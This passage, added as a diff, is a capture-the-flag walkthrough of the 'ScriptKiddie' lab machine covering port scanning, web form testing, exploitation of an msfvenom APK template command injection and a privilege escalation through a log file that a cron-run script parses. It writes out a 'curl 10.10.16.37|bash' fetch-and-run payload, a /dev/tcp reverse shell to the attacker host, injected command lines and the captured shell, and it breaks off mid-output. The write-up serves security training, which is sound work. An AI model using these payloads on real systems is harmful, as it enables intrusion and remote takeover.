@@ -1,0 +1,1129 @@
+---
+Primary_category: "[[EASY]]"
+title: "SCRIPTKIDDIE"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags: 
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[EASY]]
+
+#### Summary
+
+- ***Summary A***
+- ***Summary B***
+- ***Summary C***
+- ***Summary D***
+- ***Summary E***
+
+![[SCRIPTKIDDIE-20250408171945330.webp|400]]
+
+---
+
+#### Setup
+
+Directory creation with the Machine's Name
+
+```bash
+mkdir ScriptKiddie && cd !$
+```
+
+Creation of a *Pentesting Folder Structure* to store all the information related to the target
+
+> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***
+
+```bash
+mkt
+```
+
+> [!IMPORTANT]- *Tree*
+>
+> ```bash
+> .
+> ├── evidence
+> │   ├── creds
+> │   ├── data
+> │   └── screenshots
+> ├── logs
+> ├── scans
+> ├── scope
+> └── tools
+> ```
+>
+
+---
+
+#### Recon
+
+##### *OS Identification*
+
+First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*
+
+The standard values are →
+
+- ***About 64 → Linux***
+- ***About 128 → Windows***
+
+```bash
+ping -c1 10.129.95.150
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> PING 10.129.95.150 (10.129.95.150) 56(84) bytes of data.
+> 64 bytes from 10.129.95.150: icmp_seq=1 ttl=63 time=46.6 ms
+> 
+> --- 10.129.95.150 ping statistics ---
+> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
+> rtt min/avg/max/mdev = 46.557/46.557/46.557/0.000 ms
+> ```
+>
+
+As mentioned, according to the TTL, It seems that It is a ***Linux Target***
+
+##### *Port Scanning*
+
+###### *General Scan*
+
+Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine
+
+The Scan result is exported in a grepable format for subsequent *Port Parsing*
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.95.150
+```
+
+> [!BUG]- *AllPorts*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Thu Apr  3 15:29:36 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.95.150
+> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+> Host: 10.129.95.150 ()	Status: Up
+> Host: 10.129.95.150 ()	Ports: 22/open/tcp//ssh///, 5000/open/tcp//upnp///	Ignored State: closed (65533)
+> # Nmap done at Thu Apr  3 15:29:48 2025 -- 1 IP address (1 host up) scanned in 12.55 seconds
+> ```
+>
+
+**Open Ports → 22 and 5000**
+
+###### *Comprehensive Scan*
+
+The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***
+
+```bash
+extractPorts allPorts
+```
+
+> [!BUG]- *ExtractPorts*
+>
+> ```bash
+> [+] Extracting information...
+> 
+>    [+] IP Address: 10.129.95.150
+>    [+] Open Ports: 22,5000
+>
+> [+] Ports Copied to Clipboard
+> ```
+>
+
+Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***
+
+Note that this scan is also exported to have evidence at hand
+
+```bash
+nmap -p22,5000 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.95.150
+```
+
+> [!BUG]- *Targeted*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Thu Apr  3 15:30:37 2025 as: nmap -p22,5000 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.95.150
+> Nmap scan report for 10.129.95.150
+> Host is up (0.059s latency).
+> 
+> PORT     STATE SERVICE VERSION
+> 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+> | ssh-hostkey: 
+> |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
+> |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
+> |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
+> 5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+> |_http-title: k1d'5 h4ck3r t00l5
+> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+> 
+> # Nmap done at Thu Apr  3 15:30:48 2025 -- 1 IP address (1 host up) scanned in 11.19 seconds
+> ```
+>
+
+##### *OS Version (Codename)*
+
+In *Linux Systems*, the *Operative System Version* could be extracted through *Launchpad*
+
+According to the **Version Column Data** of the [[#Comprehensive Scan]], proceed as follows →
+
+- ***22 - SSH***
+
+> ***[Reference](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.1)***
+
+```bash
+OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 site:launchpad.net
+```
+
+***Codename → [Ubuntu Focal](https://releases.ubuntu.com/focal/)***
+
+This can be verified once the [[SHELL SCRIPTING|shell]] is obtained, i.e. the system has been compromised
+
+There are several ways to carry out it →
+
+```bash
+cat /etc/os-release
+```
+
+```bash
+hostnamectl # If System has been booted via Systemd
+```
+
+```bash
+lsb_release -a
+```
+
+```bash
+cat /etc/issue
+```
+
+```bash
+cat /proc/version
+```
+
+##### *22 - SSH*
+
+***OpenSSH Version → v8.2***
+
+###### *Banner Grabbing*
+
+The Version of the Service running can also be obtained via *Banner Grabbing* as follows →
+
+```bash
+nc -vz 10.129.95.150 22 <<< ""
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> 10.129.95.150: inverse host lookup failed: Unknown host
+> (UNKNOWN) [10.129.95.150] 22 (ssh) open
+> ```
+>
+
+##### *5000 - HTTP*
+
+Since we do not have any valid credentials yet in order to connect to the *remote machine* via *SSH*, it seems that the *entry vector* is on this *HTTP port*
+
+###### *Web Technologies*
+
+First, we can try to gather the *Web Technologies* running behind the *Website* to know exactly what we are facing
+
+We can use `whatweb` or inspect the content of the *HTTP Response* from the web server with `curl`
+
+```bash
+whatweb http://10.129.95.150:5000
+```
+
+> [!NOTE]- *Command Output*
+> 
+> ```bash
+> http://10.129.95.150:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.129.95.150], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
+> ```
+>
+
+```bash
+curl --silent --request GET --location --head 'http://10.129.95.150:5000'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> HTTP/1.0 200 OK
+> Content-Type: text/html; charset=utf-8
+> Content-Length: 2135
+> Server: Werkzeug/0.16.1 Python/3.8.5
+> Date: Thu, 03 Apr 2025 13:41:07 GMT
+> ```
+> 
+
+We see that the *Web Server* is using *Werkzeug* to handle the *HTTP Requests* and issue the respective *HTTP Response*
+
+Since several *Python-based Web Frameworks* uses the *Werkzeug library*, we do not know exactly if we are facing *Flask* or another one
+
+But, we can start thinking about *Server Side Template Injection (SSTI)* or *Command Injection* through certain calls to *system functions* using the *os* or *subprocess* libraries
+
+###### *Browser-Based Inspection*
+
+We do not know any valid domain or subdomain used as a *Virtual host*, so we can only request the *Web Content* delivered from the *IP Address*
+
+- **`http://10.129.95.150:5000`**
+
+![[SCRIPTKIDDIE-20250403155850399.webp|450]]
+
+Note that we have three interesting sections →
+
+- ***Nmap (Top 100 Ports)***
+- ***Payloads (Venom it Up)***
+- ***Sploits (Searchsploit FTW)***
+
+Each of them has its own *web form*, so the user input is processed, some injection may occur in any of them
+
+###### *Nmap Section*
+
+It requests an *IP Address* in the form to scan the *top 100 ports* on that *IP*
+
+We can test this feature by using `tshark` to intercept all incoming *TCP Traffic* from the *remote machine*
+
+If it works correctly, we should receive traffic on the most commonly used *TCP ports* according to *Nmap*
+
+```bash
+bash -c 'timeout 20 tshark --interface tun0 -Y "ip.src == 10.129.95.150" -T fields -e "tcp.dstport" 2> /dev/null' | sort -u | wc -l
+```
+
+> [!NOTE]- *Command Output*
+> 
+> ```bash
+> 100
+> ```
+>
+
+With the above command, we check that we have received traffic to *100 TCP Ports* from the *target*
+
+![[SCRIPTKIDDIE-20250406182552232.webp|400]]
+
+The above output, after the scan, is an *Nmap* scan, so, we know that *Nmap* is being executed
+
+We could try a basic *command injection* in the *Nmap form* such as the following one
+
+```bash
+10.10.16.37 ; whoami
+```
+
+But we get the this error →
+
+![[SCRIPTKIDDIE-20250406182822541.webp|300]]
+
+There may be some non-alphanumeric character that cause the application to behave differently
+
+Therefore, we can use ***[Ffuf](https://github.com/ffuf/ffuf)*** to test it
+
+```bash
+ffuf -c -of md -o nmap.ffuf -X POST -d 'ip=10.10.16.37FUZZ&action=scan' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclist/Fuzzing/special-chars.txt -u http://10.129.95.150:5000
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> ________________________________________________
+> 
+>  :: Method           : POST
+>  :: URL              : http://10.129.95.150:5000
+>  :: Wordlist         : FUZZ: /usr/share/seclist/Fuzzing/special-chars.txt
+>  :: Header           : Content-Type: application/x-www-form-urlencoded
+>  :: Data             : ip=10.10.16.37FUZZ&action=scan
+>  :: Output file      : nmap.ffuf
+>  :: File format      : md
+>  :: Follow redirects : false
+>  :: Calibration      : false
+>  :: Timeout          : 10
+>  :: Threads          : 40
+>  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+> ________________________________________________
+> 
+> !                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 51ms]
+> $                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 50ms]
+> #                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 51ms]
+> ^                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 52ms]
+> \>                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 76ms]
+> ~                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 73ms]
+> %                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 91ms]
+> ;                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 97ms]
+> \                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 94ms]
+> |                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 95ms]
+> [                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 67ms]
+> @                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 95ms]
+> .                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 67ms]
+> \`                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 70ms]
+> '                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 70ms]
+> "                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 89ms]
+> ]                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 98ms]
+> +                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 99ms]
+> *                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 116ms]
+> :                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 115ms]
+> )                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 98ms]
+> _                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 99ms]
+> ,                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 99ms]
+> }                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 99ms]
+> ?                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 116ms]
+> {                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 100ms]
+> <                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 100ms]
+> /                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 116ms]
+> (                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 99ms]
+> -                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 99ms]
+> =                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 116ms]
+> ```
+>
+
+Since all the *special chars* return the same *size*, *words* and *lines*, the *HTTP Response Body* for each one is the same
+
+We can make an *HTTP Request* to the above *URL* specifying one of them to see the *HTTP Response Body*
+
+```bash
+curl --silent --location --request POST --data 'ip=10.10.16.37;&action=scan' --header 'Content-Type: application/x-www-form-urlencoded' 'http://10.129.95.150:5000' | html2text
+```
+
+> [!NOTE]- *Command  Output*
+>
+> ```bash /invalid ip/
+> ****** k1d'5 h4ck3r t00l5 ******
+> ===============================================================================
+> ***** nmap *****
+> *** scan top 100 ports on an ip ***
+> ip:  [ip                  ]
+> 
+> [scan]
+> invalid ip
+> ===============================================================================
+> ***** payloads *****
+> *** venom it up - gen rev tcp meterpreter bins ***
+> os:  [One of: windows/linux/android]
+> lhost:  [lhost               ]
+> 
+> template file (optional):  [File]
+> 
+> [generate]
+> ===============================================================================
+> ***** sploits *****
+> *** searchsploit FTW ***
+> search:  [search              ]
+> 
+> [searchsploit]
+> ```
+>
+
+And we get the *"invalid IP"* message, so it looks that the *user input* is being correctly sanitized
+
+We could try to scan the *localhost* address from that *Nmap Scanner* to see if there are more *open ports* as the scan is performed locally
+
+![[SCRIPTKIDDIE-20250407173412186.webp|450]]
+
+But there is the same ammount of open ports, so let's move on to the next section
+
+###### *Sploits Section*
+
+If we enter any character in the field and send the data, it seems that another *system command* is being executed, this time *searchploit*
+
+![[SCRIPTKIDDIE-20250407173628431.webp|450]]
+
+We know that the *Server-Side Programming Language* is *Python*, so it is probably running *system commands* using the *os* or *subprocess* library
+
+This is the data sent by the *HTTP Post Request*
+
+![[SCRIPTKIDDIE-20250407174218809.webp|350]]
+
+Therefore, since we do not have access to inspect the *application's source code*, let's check if the input is also correctly sanitized
+
+```bash
+test; whoami
+```
+
+![[SCRIPTKIDDIE-20250407174347131.webp|450]]
+
+We get the above message if we send the previous payload
+
+If we delete the special character, used in this case to be able to separate two commands at the system level, the output is different
+
+It does not detect any attack
+
+![[SCRIPTKIDDIE-20250407174701251.webp|450]]
+
+We use `ffuf` again to check all the special characters
+
+```bash
+ffuf -c -fw 121 -of md -o sploits.ffuf -X POST -d 'search=testFUZZ&action=searchsploit' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclist/Fuzzing/special-chars.txt -u http://10.129.95.150:5000
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> :: Method           : POST
+>  :: URL              : http://10.129.95.150:5000
+>  :: Wordlist         : FUZZ: /usr/share/seclist/Fuzzing/special-chars.txt
+>  :: Header           : Content-Type: application/x-www-form-urlencoded
+>  :: Data             : search=testFUZZ&action=searchsploit
+>  :: Output file      : sploits.ffuf
+>  :: File format      : md
+>  :: Follow redirects : false
+>  :: Calibration      : false
+>  :: Timeout          : 10
+>  :: Threads          : 40
+>  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+>  :: Filter           : Response words: 121
+> ________________________________________________
+> 
+> .                       [Status: 200, Size: 5159, Words: 418, Lines: 102, Duration: 706ms]
+> +                       [Status: 200, Size: 16732, Words: 1607, Lines: 229, Duration: 724ms]
+> &                       [Status: 200, Size: 16732, Words: 1607, Lines: 229, Duration: 784ms]
+> ```
+>
+
+We exclude all the *HTTP Requests* which contains in the *HTTP response* 121 words as it will contain the same output as the previous image
+
+But, something similar happens with the above characters, if we make an *HTTP Request* using those characters
+
+```bash
+for _char in '.' '+' '&' ; do curl --silent --request POST --location --data "search=test${_char};&action=searchsploit" --header 'Content-Type: application/x-www-form-urlencoded' 'http://10.129.95.150:5000' | html2text | awk '/\[searchsploit\]/,0' ; done
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [searchsploit]
+> stop hacking me - well hack you back
+> [searchsploit]
+> stop hacking me - well hack you back
+> ```
+>
+
+Therefore, the *user input* is also being correctly sanitized in this section
+
+We could do the same thing for the other *POST parameter*, but the same history happens
+
+###### *Payloads Section*
+
+And we arrive to the last section, the *payloads* one
+
+It looks that this section generates a certain payload for the user according to the selected *OS*
+
+![[SCRIPTKIDDIE-20250407180522950.webp|450]]
+
+The interesting thing is that we can upload a template file
+
+We know that the *msfvenom* binary supports *input templates* for generating a payload
+
+Therefore, it might uses *msfvenom* to create the payload
+
+We could think about uploading a malicious file or template for msfvenom
+
+If we search for something similar on the internet, we came across the following
+
+![[SCRIPTKIDDIE-20250407180952002.webp|300]]
+
+It says that there is a *Command Injection* vulnerability in a specific version of *msfvenom*
+
+First of all, we do not know if *msfvenom* is being used, and we do not know if the version of *msfvenom* installed is the vulnerable one
+
+We see that the reference is from *ExploitDB*, so we could search for this vulnerability using *searchsploit*
+
+```bash
+searchsploit msfvenom
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> ------------------------------------------------------------------
+ > Exploit Title                                                                                                                                                                                                        |  Path
+> ------------------------------------------------------------------
+> Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                                                                                                 | multiple/local/49491.py
+> ------------------------------------------------------------------
+> Shellcodes: No Results
+> ```
+>
+
+And there is a match
+
+---
+
+#### Exploitation
+
+##### *Command Injection via MSFVenom APK Template*
+
+So it seems that there is a way to get *command injection* by uploading a malicious *APK* template
+
+I suppose that the *payload* is executed when the given binary, in this case *msfvenom*, parses the data of the provided template
+
+> ***[Reference](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md)***
+
+Therefore, simply copy the content of ***[this](https://github.com/justinsteven/advisories/blob/main/2020_metasploit_msfvenom_apk_template_cmdi.md#poc)*** *python PoC* and modify the payload parameter value as follows
+
+```bash
+payload = 'curl 10.10.16.37|bash'
+```
+
+Then, run the script to create the malicious *APK* file
+
+```bash
+python3 exploit.py
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [+] Manufacturing evil apkfile
+> Payload: curl 10.10.16.37|bash
+> -dname: CN='|echo MN2XE3BAGEYC4MJQFYYTMLRTG56GEYLTNA====== | base32 -d | sh #
+> 
+>   adding: empty (stored 0%)
+> Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 90 days
+> 	for: CN="'|echo MN2XE3BAGEYC4MJQFYYTMLRTG56GEYLTNA====== | base32 -d | sh #"
+> jar signed.
+> 
+> Warning: 
+> The signer's certificate is self-signed.
+> The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
+> The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
+> POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
+> 
+> [+] Done! apkfile is at /tmp/tmp9n1wat73/evil.apk
+> Do: msfvenom -x /tmp/tmp9n1wat73/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
+> 
+> ```
+>
+
+***APK File Path →*** **`/tmp/tmp9n1wat73/evil.apk`**
+
+Before upload the above file →
+
+Create an *index.html* file with the following content →
+
+```bash
+nvim index.html
+```
+
+> [!BUG]- *index.html*
+>
+> ```bash
+> bash -i &> /dev/tcp/10.10.16.37/443 0>&1
+> ```
+>
+
+And build a *Simple HTTP Server* using *python*
+
+```bash
+python3 -m http.server 80
+```
+
+All that remains is to set up a listener on *port 443* and upload the *malicious APK Template*
+
+```bash
+nc -nlvp 443
+```
+
+- ***Upload the malicious APK File***
+
+![[SCRIPTKIDDIE-20250407184244891.webp|200]]
+
+> [!NOTE]- *Simple HTTP Server Output*
+>
+> ```bash
+> Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+> 10.129.95.150 - - [07/Apr/2025 18:42:21] "GET / HTTP/1.1" 200 -
+> 10.129.95.150 - - [07/Apr/2025 18:42:33] "GET / HTTP/1.1" 200 -
+> 10.129.95.150 - - [07/Apr/2025 18:42:45] "GET / HTTP/1.1" 200 -
+> ```
+>
+
+> [!NOTE]- *Netcat Output*
+>
+> ```bash
+> listening on [any] 443 ...
+> connect to [10.10.16.37] from (UNKNOWN) [10.129.95.150] 57634
+> bash: cannot set terminal process group (935): Inappropriate ioctl for device
+> bash: no job control in this shell
+> kid@scriptkiddie:~/html$
+> ```
+>
+
+---
+
+#### Shell as Web User
+
+Once a connection via *Reverse Shell* is stablished, just proceed as follows to upgrade the obtained shell to a *Fully Interactive TTY*
+
+> ***[Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)***
+
+##### *Script*
+
+```bash
+script /dev/null -c bash
+<C-z>
+```
+
+```bash
+stty raw -echo ; fg
+reset xterm
+```
+
+```bash
+export TERM=xterm-256color
+export SHELL=/bin/bash
+. /etc/skel/.bashrc
+stty rows 61 columns 248
+```
+
+---
+
+#### Privesc #1
+
+***Initial Non-Privileged User → kid***
+
+Before proceeding with the enumeration, just grab the content of the *user.txt* flag
+
+```bash
+cat ~/user.txt
+```
+
+##### *Command Injection in Bash Script via a Log File*
+
+We check if the user belongs to any system group that involves a *privesc vector*
+
+```bash
+id
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> uid=1000(kid) gid=1000(kid) groups=1000(kid)
+> ```
+>
+
+Nothing interesting
+
+We could check if the user has any *sudo* privileges and is able to run a specific binary or command as some user
+
+But, this time we have no valid password
+
+```bash
+sudo -l
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [sudo] password for kid: 
+> Sorry, try again.
+> [sudo] password for kid: 
+> Sorry, try again.
+> [sudo] password for kid: 
+> sudo: 3 incorrect password attempts 
+> ```
+>
+
+Let's list the *binaries* on the system with the *SUID* privilege enabled
+
+```bash
+find / -path '/snap*' -prune -o -perm -4000 -type f -ls 2> /dev/null
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+>   1051313     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+>   1051518    464 -rwsr-xr-x   1 root     root       473576 May 29  2020 /usr/lib/openssh/ssh-keysign
+>   1057659    128 -rwsr-xr-x   1 root     root       130152 Nov 19  2020 /usr/lib/snapd/snap-confine
+>   1051306     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+>   1051528     24 -rwsr-xr-x   1 root     root          22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+>   1049617     56 -rwsr-xr-x   1 root     root          55528 Jul 21  2020 /usr/bin/mount
+>   1051293     68 -rwsr-xr-x   1 root     root          67816 Jul 21  2020 /usr/bin/su
+>   1050497     84 -rwsr-xr-x   1 root     root          85064 May 28  2020 /usr/bin/chfn
+>   1050608     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
+>   1050807     68 -rwsr-xr-x   1 root     root          68208 May 28  2020 /usr/bin/passwd
+>   1050828     32 -rwsr-xr-x   1 root     root          31032 Aug 16  2019 /usr/bin/pkexec
+>   1050774     44 -rwsr-xr-x   1 root     root          44784 May 28  2020 /usr/bin/newgrp
+>   1050503     52 -rwsr-xr-x   1 root     root          53040 May 28  2020 /usr/bin/chsh
+>   1049624     40 -rwsr-xr-x   1 root     root          39144 Jul 21  2020 /usr/bin/umount
+>   1053168    164 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /usr/bin/sudo
+>   1050626     88 -rwsr-xr-x   1 root     root          88464 May 28  2020 /usr/bin/gpasswd
+>   1050429     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
+> ```
+>
+
+There are no interesting ones apart from `pkexec`, but we will not exploit it as it is not the intended *privesc way*
+
+We also list the *capabilites* assigned to certain binaries in the system
+
+```bash
+getcap -r / 2> /dev/null
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+> /usr/bin/mtr-packet = cap_net_raw+ep
+> /usr/bin/traceroute6.iputils = cap_net_raw+ep
+> /usr/bin/ping = cap_net_raw+ep
+> ```
+>
+
+Nothing here either
+
+If we list the existent directories in the `/home` directory →
+
+```bash
+ls /home
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> kid pwn
+> ```
+>
+
+There is another user called ***pwn***
+
+We can list all availabe resources in the *kid's home directory*, but there is nothing such as a defined *alias* in *.bashrc* or a *list of executed commands*  in *.bash_history*
+
+However, there is a *logs* directory which is *world-writable*
+
+We can list the resources in the *pwn user's home directory* that we can read as the current user
+
+```bash
+find /home/pwn -readable -ls 2> /dev/null
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+>      7669      4 drwxr-xr-x   6 pwn      pwn          4096 Feb  3  2021 /home/pwn
+>      7671      4 -rw-r--r--   1 pwn      pwn           220 Feb 25  2020 /home/pwn/.bash_logout
+>      7771      4 drwxrwxr-x   3 pwn      pwn          4096 Jan 28  2021 /home/pwn/.local
+>      7677      4 -rw-rw-r--   1 pwn      pwn            74 Jan 28  2021 /home/pwn/.selected_editor
+>      7673      4 -rw-r--r--   1 pwn      pwn          3771 Feb 25  2020 /home/pwn/.bashrc
+>      3444      0 lrwxrwxrwx   1 root     root            9 Feb  3  2021 /home/pwn/.bash_history -> /dev/null
+>      7675      4 -rw-r--r--   1 pwn      pwn           807 Feb 25  2020 /home/pwn/.profile
+>      7779      4 -rwxrwxr--   1 pwn      pwn           250 Jan 28  2021 /home/pwn/scanlosers.sh
+> ```
+>
+
+There is a *.sh* script
+
+We inspect its content to see what exactly it does
+
+> [!BUG]- scanlosers.sh
+>
+> ```bash
+> #!/bin/bash
+> 
+> log=/home/kid/logs/hackers
+> 
+> cd /home/pwn/
+> cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+>     sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+> done
+> 
+> if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+> ```
+>
+
+It parses the information contained within the specified *log file* called hackers located inside the previous mentioned *world-writable* directory
+
+Specifically, it does the following actions →
+
+- ***Extract from the third columns to the end of every line of the log file*** → `input | cut -d' ' -f3-`
+
+- ***Remove the dupes*** → `input | sort -u`
+
+- ***Iterate through each line of the provided input*** → `input | while read ip; do ... ; done`
+
+For each iteration, it runs an *nmap command* which scans the value of the line provided as input i.e. the output of the previous command
+
+It therefore expects an ip for each line
+
+The problem here is that the input is not being sanitized and the user running the script can control the provided input
+
+Remember that *others* have *write perms* on the `/home/kid/logs` directory
+
+Therefore, we could create a file called *hacker* and add a line to it that performs the following action →
+
+- ***Exit the Nmap execution context using a command separator such as `;` or a subshell*** **`$( command )`**
+
+- ***Execute any command we want from the new context***
+
+- ***Comment out the remaining part of the first command to avoid syntax errors***
+
+We have to take into account how the script parses the information contained within the log file
+
+It takes from the third columns to the end of each line taking as separator a blank, so, in order to inject the command we want, we have to add two random chars separated by a blank before the mentioned command
+
+It would be something like this →
+
+```bash
+x y ; ping -c1 10.10.16.37 #
+```
+
+or like this
+
+```bash
+x y ; $( ping -c1 10.10.16.37 ) #
+```
+
+But, before continue, we need to know who is running this script
+
+To do this, we can transfer a ***[pspy](https://github.com/DominicBreuker/pspy)*** binary to the *remote machine*
+
+###### *From the Attacker*
+
+- ***Download the pspy binary***
+
+```bash
+curl --silent --location --request GET 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64' --output pspy64
+```
+
+- ***Build a Simple HTTP Server with Python***
+
+```bash
+python3 -m http.server 80
+```
+
+###### *From the Target*
+
+- ***Transfer the Binary and execute it***
+
+```bash
+curl --silent --request GET --location 'http://10.10.16.37/pspy64' --output /dev/shm/pspy64
+```
+
+```bash
+chmod 777 !$
+!$
+```
+
+While this binary is logging in the terminal all running processes, we can run the following command to add a line to the log file mentioned above
+
+```bash
+echo 'x y ; ping -c1 10.10.16.37 #' >> /home/kid/logs/hackers
+```
+
+As soon as the line is added, a scheduled task is executed, which triggers the following commands and actions
+
+> [!NOTE]- *PSPY Output*
+>
+> ```bash
+> 2025/04/08 13:56:38 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
+> 2025/04/08 13:56:56 CMD: UID=1001  PID=1666   | ls --color=auto 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1675   | /bin/bash -c  /home/pwn/scanlosers.sh 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1681   | /bin/bash /home/pwn/scanlosers.sh 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1680   | sh -c nmap --top-ports 10 -oN recon/; ping -c1 10.10.16.37 #.nmap ; ping -c1 10.10.16.37 # 2>&1 >/dev/null 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1683   | nmap --top-ports 10 -oN recon/ 
+> 2025/04/08 13:57:53 CMD: UID=0     PID=1684   | /usr/sbin/incrond 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1688   | /bin/bash /home/pwn/scanlosers.sh 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1687   | /bin/bash /home/pwn/scanlosers.sh 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1686   | /bin/bash /home/pwn/scanlosers.sh 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1685   | /bin/bash /home/pwn/scanlosers.sh 
